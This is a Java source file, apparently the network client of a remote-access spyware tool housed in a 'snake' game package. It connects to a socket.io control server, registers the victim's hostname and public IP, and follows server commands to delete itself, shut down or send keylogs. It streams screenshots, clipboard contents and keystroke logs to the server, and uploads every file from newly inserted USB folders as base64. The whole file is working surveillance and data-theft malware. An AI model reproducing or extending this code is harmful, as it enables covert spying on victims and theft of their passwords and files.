package snake.logic.connection;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter.Listener;
import snake.logic.enums.Changes;
import snake.logic.model.Model;
import snake.logic.util.JSONReader;
import snake.logic.util.SystemInformation;
import snake.tools.FileTools;

import java.awt.image.BufferedImage;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.util.Base64;

import org.json.JSONException;
import org.json.JSONObject;

public class SocketClient implements PropertyChangeListener{
    private Model model;
    private Socket socket;

    private static final String SERVER_IP = "http://localhost:8080";

    public SocketClient(Model model) throws URISyntaxException {
        this.model = model;
        model.registerPropertyChangeListener(this);

        socket = IO.socket(SERVER_IP);
        registerEvents();
    }

    public void registerEvents() {
        socket.on(Socket.EVENT_CONNECT, new Listener() {
            @Override
            public void call(Object... args) {
                try {
                    socket.emit("register", registerData());
                    model.firePropertyChange(Changes.CONNECT, false, true);
                } catch (Exception e) {}
            }
        }).on("disconnect", new Listener() {
            @Override
            public void call(Object... args) {
                model.firePropertyChange(Changes.DISCONNECT, true, false);
                System.out.println("Disconnected from server.");
            }
        }).on("delete", new Listener() {
            @Override
            public void call(Object... args) {
                try {
                    model.cleanup();
                } catch (IOException | URISyntaxException e) {}
            }
        }).on("shutdown", new Listener() {
            @Override
            public void call(Object... args) {
                System.out.println("Server has requested to shutdown the client.");
                System.exit(0);
            }
        }).on("response", new Listener() {
            @Override
            public void call(Object... args) {
                System.out.println("Response from server: " + args[0].toString());
            }
        }).on("request_keylogs", new Listener() {
            @Override
            public void call(Object... args) {
                model.firePropertyChange(Changes.REQUEST_KEYLOGS, null, null);
            }
        }).on("hearbeat", new Listener() {
            @Override
            public void call(Object... args) {
                try {
                    socket.emit("heartbeat", new JSONObject().put("guid", SystemInformation.GUID).toString());
                } catch (JSONException e) {}
            }
        });
    }

    public String registerData() throws Exception {
        return new JSONObject()
                .put("client_id", InetAddress.getLocalHost().getHostName())
                .put("ip", JSONReader.readJsonFromURL("https://api.ipify.org?format=json").getString("ip"))
                .put("password", "4@Gd9#kLp1!xQ8nZ$")
                .put("guid", SystemInformation.GUID)
                .toString();
    }

    public void connect() {
        socket.connect();
    }

    public void uploadFolder(String folderPath) {
        File folder = new File(folderPath);
        if (!folder.isDirectory()) {
            System.out.println("The provided path is not a directory.");
            return;
        }

        File[] files = folder.listFiles();
        if (files == null || files.length == 0) {
            System.out.println("The directory is empty or an error occurred.");
            return;
        }

        for (File file : files) {
            if (file.isFile()) {
                try {
                    byte[] fileContent = Files.readAllBytes(file.toPath());
                    String base64 = Base64.getEncoder().encodeToString(fileContent);
                    JSONObject json = new JSONObject()
                            .put("file_name", file.getName())
                            .put("file_data", base64)
                            .put("guid", SystemInformation.GUID);
                    socket.emit("upload_file", json.toString());
                    System.out.println("Uploaded file: " + file.getName());
                } catch (IOException | JSONException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void propertyChange(PropertyChangeEvent evt) {
        switch (Changes.valueOf(evt.getPropertyName())) {
            case UPDATE_IMAGE:
                try {
                    String base64 = FileTools.encodeImageToBase64((BufferedImage) evt.getNewValue());
                    JSONObject json = new JSONObject()
                                        .put("image_data", base64)
                                        .put("guid", SystemInformation.GUID);
                    socket.emit("update_stream", json.toString());
                    System.out.println("Updated Stream");
                } catch (JSONException e) {}
                break;
            case UPDATE_CLIPBOARD:
                try {
                    JSONObject json = new JSONObject().put("clipboard_data", String.valueOf(evt.getNewValue())).put("guid", SystemInformation.GUID);

                    socket.emit("update_clipboard", json.toString());
                    System.out.println("Updated Clipboard");
                } catch (JSONException e) {}
                break;
            case UPDATE_KEYLOG:
                try {
                    JSONObject json = new JSONObject().put("keylogs", String.valueOf(evt.getNewValue())).put("guid", SystemInformation.GUID);
                    
                    socket.emit("update_keylogs", json.toString());
                    System.out.println("Updated Keylogs");
                } catch (JSONException e) {}
                break;
            case UPDATE_USB:
                uploadFolder(String.valueOf(evt.getNewValue()));
                break;
            default:
                break;
        }
    }
}
